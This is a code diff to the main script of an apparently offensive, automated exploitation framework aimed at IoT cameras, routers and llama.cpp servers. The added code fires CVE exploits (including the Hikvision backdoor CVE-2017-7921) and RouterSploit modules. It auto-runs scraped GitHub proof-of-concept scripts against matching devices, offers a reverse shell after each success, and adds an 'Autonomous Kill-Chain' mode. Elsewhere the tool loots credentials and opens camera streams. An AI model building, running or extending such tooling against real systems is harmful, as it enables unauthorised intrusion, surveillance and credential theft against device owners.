@@ -1,7 +1,10 @@
 import sys
 import os
+import json
 
-_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+from core.paths import project_root, setup_project_env
+
+_ROOT = project_root()
 if _ROOT not in sys.path:
     sys.path.insert(0, _ROOT)
 
@@ -283,6 +286,9 @@ def main(target_input, manual_mode=False):
                 if llama_exp.run_exploit():
                     loot.add_note(f"CVE-2026-34159: Potential llama.cpp RCE exploit sent on port {port}. Check reverse shell listener.")
                     save_success(ip, f"llama.cpp ({port})", "CVE-2026-34159 RCE payload delivered")
+                    if not manual_mode:
+                        from engines.reverse_shell_prompt import offer_reverse_shell
+                        offer_reverse_shell(f"llama.cpp CVE-2026-34159 (port {port})", ip)
             
             if is_laravel:
                 lex = LaravelExploiter(target_url)
@@ -343,6 +349,10 @@ def main(target_input, manual_mode=False):
                 for p in snap_paths:
                     loot.add_file(p)
                 cam.open_in_vlc(use_sub_stream=True)
+
+                if getattr(hexp, "backdoor_active", False) and not manual_mode:
+                    from engines.reverse_shell_prompt import offer_reverse_shell
+                    offer_reverse_shell(f"Hikvision backdoor CVE-2017-7921 (port {port})", ip)
 
             if is_zte:
                 zte = ZTEExploiter(target_url)
@@ -443,7 +453,9 @@ def main(target_input, manual_mode=False):
                 if discovered_vulns:
                     log(f"!!! {len(discovered_vulns)} VULNERABILITIES DETECTED !!!", "WARNING")
                     for vuln in discovered_vulns:
-                        ext_tools.run_routersploit_exploit(vuln)
+                        if ext_tools.run_routersploit_exploit(vuln) and not manual_mode:
+                            from engines.reverse_shell_prompt import offer_reverse_shell
+                            offer_reverse_shell(f"RouterSploit {vuln}", ip)
 
             if run_ingram or (manual_mode and port in (554, 8000, 8080, 37777)):
                 ext_tools.run_ingram_scan()
@@ -465,6 +477,18 @@ def main(target_input, manual_mode=False):
                 loot.add(router_entry)
                 save_success(ip, f"Web ({port})", f"{router_entry.username}:{router_entry.password}")
                 router_pwned = True
+
+        # --- GitHub PoC Arsenal (scripts/new_pocs/) ---
+        if not manual_mode:
+            from engines.poc_runner import PoCRunner
+            poc_runner = PoCRunner(ip, port)
+            poc_results = poc_runner.run_matching(device_type)
+            for pr in poc_results:
+                rel = pr.get("rel", os.path.basename(pr.get("script", "?")))
+                loot.add_note(f"PoC {rel}: success={pr.get('success', False)}")
+                if pr.get("success"):
+                    from engines.reverse_shell_prompt import offer_reverse_shell
+                    offer_reverse_shell(f"GitHub PoC {rel}", ip)
 
         # --- Auto-Decryptor Phase (Hash Cracking) ---
         # If we found any hashes in the loot (we can check notes or extra dicts), we pass them to John
@@ -603,6 +627,7 @@ def main(target_input, manual_mode=False):
             pass
 
 if __name__ == "__main__":
+    setup_project_env()
     from engines.lan_scanner import LANScanner
     from engines.utils import extract_ip
     from engines.updater import run_startup_update
@@ -622,6 +647,7 @@ if __name__ == "__main__":
             print("  [3] Show Previous Targets (History)")
             print("  [4] Update Exploit Arsenal (GitHub Zero-Day Scraper)")
             print("  [5] Social OSINT (Email / Phone / Username Lookup)")
+            print("  [6] Decepticon Mode (Autonomous Kill-Chain)")
             print("  [0] Exit")
             start_choice = input("\n[?] Select option: ").strip()
             
@@ -705,8 +731,15 @@ if __name__ == "__main__":
                 from engines.social_osint import run_social_osint_menu
                 run_social_osint_menu()
                 continue
+            elif start_choice == '6':
+                target = input("[?] Enter Target URL or IP for Decepticon Mode: ").strip()
+                if target:
+                    from engines.decepticon_core import DecepticonCore
+                    core = DecepticonCore(target)
+                    core.run_autonomous_mode()
+                continue
             else:
-                log("Invalid option. Please choose 1, 2, 3, 4, 5, or 0.", "ERROR")
+                log("Invalid option. Please choose 1, 2, 3, 4, 5, 6, or 0.", "ERROR")
         
         if target:
             while True:
